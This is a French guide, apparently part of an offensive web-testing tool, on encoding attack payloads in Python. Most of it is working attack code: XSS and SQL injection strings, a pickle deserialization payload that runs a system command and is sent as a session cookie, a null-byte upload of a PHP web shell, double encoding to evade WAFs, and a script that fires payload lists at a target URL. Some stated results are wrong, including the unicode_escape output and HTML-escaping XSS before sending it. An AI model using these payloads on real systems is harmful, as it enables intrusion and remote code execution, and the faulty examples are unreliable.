# 🔐 Guide Encodage Payloads en Python

> **Auteur:** Samuel - ShieldAI  
> **Version:** 1.0.0  
> **Date:** 2026-03-10

---

## 📚 Types d'Encodage

### **1. none** - Pas d'encodage

```python
payload = "<script>alert('XSS')</script>"
# Utiliser tel quel, pas de transformation
```

**Usage:** Payloads basiques, tests directs

---

### **2. url** - URL Encoding

```python
import urllib.parse

# Méthode 1: urllib.parse.quote()
payload = "<script>alert('XSS')</script>"
encoded = urllib.parse.quote(payload)
# Résultat: %3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E

# Méthode 2: urllib.parse.quote_plus() (espace = +)
payload = "admin password"
encoded = urllib.parse.quote_plus(payload)
# Résultat: admin+password

# Méthode 3: Encodage manuel caractère par caractère
def url_encode_full(text):
    """Encode TOUS les caractères"""
    return ''.join(f'%{ord(c):02X}' for c in text)

payload = "<script>"
encoded = url_encode_full(payload)
# Résultat: %3C%73%63%72%69%70%74%3E
```

**Correspondances communes:**
```python
url_chars = {
    '<': '%3C',
    '>': '%3E',
    ' ': '%20',  # ou '+'
    '"': '%22',
    "'": '%27',
    '/': '%2F',
    '&': '%26',
    '?': '%3F',
    '=': '%3D',
    '\n': '%0A',
    '\r': '%0D'
}
```

**Usage complet:**
```python
import urllib.parse
import requests

# Payload basique
payload = "' OR '1'='1"

# Encoder pour query string
encoded_payload = urllib.parse.quote(payload)

# Utiliser dans requête
url = f"http://target.com/search?q={encoded_payload}"
response = requests.get(url)
```

---

### **3. html** - HTML Entity Encoding

```python
import html

# Méthode 1: html.escape()
payload = "<script>alert('XSS')</script>"
encoded = html.escape(payload)
# Résultat: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

# Méthode 2: Encodage manuel avec dict
def html_encode(text):
    html_entities = {
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '&': '&amp;'
    }
    for char, entity in html_entities.items():
        text = text.replace(char, entity)
    return text

payload = "<script>"
encoded = html_encode(payload)
# Résultat: &lt;script&gt;

# Méthode 3: Encodage numérique
def html_encode_numeric(text):
    """Encode en entités numériques"""
    return ''.join(f'&#{ord(c)};' for c in text)

payload = "<script>"
encoded = html_encode_numeric(payload)
# Résultat: &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
```

**Correspondances:**
```python
html_entities = {
    '<': '&lt;',
    '>': '&gt;',
    '&': '&amp;',
    '"': '&quot;',
    "'": '&#x27;',  # ou '&apos;'
    ' ': '&nbsp;'   # (espace insécable)
}
```

**Usage complet:**
```python
import html
import requests

payload = "<img src=x onerror=alert('XSS')>"

# Encoder
encoded = html.escape(payload)

# POST dans form
data = {
    'comment': encoded
}
response = requests.post('http://target.com/comment', data=data)
```

---

### **4. base64** - Base64 Encoding

```python
import base64

# Méthode 1: Encoder string
payload = "malicious_pickle_payload"
encoded = base64.b64encode(payload.encode()).decode()
# Résultat: bWFsaWNpb3VzX3BpY2tsZV9wYXlsb2Fk

# Méthode 2: Encoder bytes directement
payload_bytes = b'\x80\x04\x95...'  # Pickle bytes
encoded = base64.b64encode(payload_bytes).decode()

# Méthode 3: Décoder
decoded = base64.b64decode(encoded)

# Méthode 4: URL-safe base64 (-, _ au lieu de +, /)
encoded_urlsafe = base64.urlsafe_b64encode(payload.encode()).decode()
```

**Usage complet - Deserialization:**
```python
import base64
import pickle

# Créer payload malicieux (exemple simplifié)
class MaliciousPayload:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

# Sérialiser
malicious = pickle.dumps(MaliciousPayload())

# Encoder en base64
encoded = base64.b64encode(malicious).decode()

# Envoyer
import requests
cookies = {'session': encoded}
response = requests.get('http://target.com', cookies=cookies)
```

---

### **5. null_byte** - Null Byte Injection

```python
# Méthode 1: Avec %00
payload = "/etc/passwd%00.jpg"
# Le %00 termine la string pour certains languages (PHP ancien)

# Méthode 2: Null byte réel (bytes)
payload = b"/etc/passwd\x00.jpg"

# Méthode 3: En Python, construire payload
def add_null_byte(path, extension):
    """Ajoute null byte avant extension"""
    return f"{path}%00{extension}"

payload = add_null_byte("/etc/passwd", ".jpg")
# Résultat: /etc/passwd%00.jpg
```

**Usage complet - File Upload:**
```python
import requests

# Payload avec null byte
filename = "shell.php%00.jpg"

# Upload fichier
files = {
    'file': (filename, b'<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}
response = requests.post('http://target.com/upload', files=files)

# Résultat: Server pense que c'est .jpg mais exécute .php
```

---

## 🔧 Fonction Complète d'Encodage

```python
import urllib.parse
import html
import base64
from typing import Union

def encode_payload(payload: str, encoding: str) -> Union[str, bytes]:
    """
    Encode payload selon le type d'encodage
    
    Args:
        payload: Payload à encoder
        encoding: Type ('none', 'url', 'html', 'base64', 'null_byte')
        
    Returns:
        Payload encodé (str ou bytes)
    
    Examples:
        >>> encode_payload("<script>", "url")
        '%3Cscript%3E'
        
        >>> encode_payload("<script>", "html")
        '&lt;script&gt;'
    """
    
    if encoding == "none":
        return payload
    
    elif encoding == "url":
        return urllib.parse.quote(payload)
    
    elif encoding == "html":
        return html.escape(payload)
    
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    
    elif encoding == "null_byte":
        # Ajoute %00 avant dernière extension
        if '.' in payload:
            parts = payload.rsplit('.', 1)
            return f"{parts[0]}%00.{parts[1]}"
        return payload + "%00"
    
    else:
        raise ValueError(f"Unknown encoding: {encoding}")


# Tests
if __name__ == "__main__":
    # Test XSS
    xss = "<script>alert('XSS')</script>"
    print("URL:", encode_payload(xss, "url"))
    print("HTML:", encode_payload(xss, "html"))
    
    # Test SQLi
    sqli = "' OR '1'='1"
    print("SQLi URL:", encode_payload(sqli, "url"))
    
    # Test File Upload
    file = "shell.php.jpg"
    print("Null byte:", encode_payload(file, "null_byte"))
```

---

## 🎯 Utilisation avec payloads_v2.json

```python
import json
import requests
from typing import Dict, Any

def load_payloads(filepath: str = "payloads_v2_final.json") -> Dict:
    """Charge fichier payloads"""
    with open(filepath, 'r', encoding='utf-8') as f:
        return json.load(f)

def send_payload(url: str, payload_data: Dict[str, Any], injection_point: str):
    """
    Envoie payload avec encodage approprié
    
    Args:
        url: URL cible
        payload_data: Dict avec 'payload', 'encoding', 'type'
        injection_point: 'query', 'form', 'header', etc.
    """
    
    # Récupérer payload et encodage
    raw_payload = payload_data['payload']
    encoding_type = payload_data.get('encoding', 'none')
    
    # Encoder
    encoded_payload = encode_payload(raw_payload, encoding_type)
    
    # Envoyer selon injection point
    if injection_point == "query":
        # Query parameter
        response = requests.get(f"{url}?q={encoded_payload}")
    
    elif injection_point == "form":
        # POST form data
        data = {'field': encoded_payload}
        response = requests.post(url, data=data)
    
    elif injection_point == "header":
        # HTTP header
        headers = {'User-Agent': encoded_payload}
        response = requests.get(url, headers=headers)
    
    elif injection_point == "cookie":
        # Cookie
        cookies = {'session': encoded_payload}
        response = requests.get(url, cookies=cookies)
    
    return response


# Exemple complet
if __name__ == "__main__":
    # Charger payloads
    config = load_payloads()
    
    # Récupérer payloads XSS
    xss_payloads = config['payloads']['XSS']['payloads']
    
    # Tester chaque payload
    target_url = "http://target.com/search"
    
    for payload_data in xss_payloads:
        print(f"Testing: {payload_data['type']}")
        
        # Envoyer
        response = send_payload(
            url=target_url,
            payload_data=payload_data,
            injection_point="query"
        )
        
        # Vérifier détection
        indicators = config['payloads']['XSS']['detection']['indicators']
        
        for indicator in indicators:
            if indicator.lower() in response.text.lower():
                print(f"✅ Vuln détectée! Indicator: {indicator}")
                break
```

---

## 🔥 Exemples Avancés

### **Double Encodage**

```python
def double_encode(payload: str, encoding1: str, encoding2: str) -> str:
    """Double encodage pour bypass WAF"""
    step1 = encode_payload(payload, encoding1)
    step2 = encode_payload(step1, encoding2)
    return step2

# Exemple: URL encode puis URL encode encore
payload = "<script>"
double_encoded = double_encode(payload, "url", "url")
# Résultat: %253Cscript%253E
```

### **Encodage Mixte**

```python
def mixed_encode(payload: str) -> str:
    """Encode certains chars seulement"""
    # Encoder juste les < et >
    result = payload.replace('<', '%3C').replace('>', '%3E')
    return result

payload = "<script>alert('XSS')</script>"
encoded = mixed_encode(payload)
# Résultat: %3Cscript%3Ealert('XSS')%3C/script%3E
```

### **Encodage Unicode**

```python
def unicode_encode(text: str) -> str:
    """Encode en Unicode escape"""
    return text.encode('unicode_escape').decode('ascii')

payload = "<script>"
encoded = unicode_encode(payload)
# Résultat: \u003cscript\u003e
```

---

## 📊 Tableau de Correspondances

| Caractère | URL      | HTML      | Unicode   | Hex    |
|-----------|----------|-----------|-----------|--------|
| `<`       | `%3C`    | `&lt;`    | `\u003c`  | `\x3c` |
| `>`       | `%3E`    | `&gt;`    | `\u003e`  | `\x3e` |
| `"`       | `%22`    | `&quot;`  | `\u0022`  | `\x22` |
| `'`       | `%27`    | `&#x27;`  | `\u0027`  | `\x27` |
| ` `       | `%20`    | `&nbsp;`  | `\u0020`  | `\x20` |
| `&`       | `%26`    | `&amp;`   | `\u0026`  | `\x26` |
| `/`       | `%2F`    | `/`       | `\u002f`  | `\x2f` |

---

## ⚠️ Notes Importantes

1. **URL encoding** - Nécessaire pour query params et paths
2. **HTML encoding** - Protège contre XSS côté client
3. **Base64** - Pour payloads binaires (deserialization, upload)
4. **Null byte** - Fonctionne seulement sur anciennes versions PHP/C
5. **Double encoding** - Bypass certains WAF qui décodent 1 fois

---

**Fin du guide**
